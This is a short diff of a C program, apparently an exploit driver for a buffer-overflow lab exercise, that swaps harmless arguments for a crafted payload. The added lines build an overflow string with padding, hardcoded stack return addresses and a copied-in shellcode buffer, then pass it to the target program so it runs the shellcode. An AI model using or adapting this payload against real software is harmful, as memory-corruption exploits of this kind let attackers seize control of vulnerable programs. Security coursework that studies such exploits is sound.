@@ -9,9 +9,12 @@
 
 int main(void)
 {
-	char arg1[] = "Hi there!";
-	char arg2[] = "4";
-	char arg3[] = "4";
+	char arg1[100];
+	strcpy(arg1, "aaaabbbbcccc\x08\xfd\xff\xbe");
+	strcpy(arg1+16, shellcode);
+	strcat(arg1, "aaaaaaaaaaaaaaaaaaaaaaaaaabbbbb\xf8\xfc\xff\xbe");
+	char arg2[] = "0";
+	char arg3[] = "53";
 	char *args[] = { TARGET, arg1, arg2, arg3, NULL };
 	char *env[] = { NULL };
 
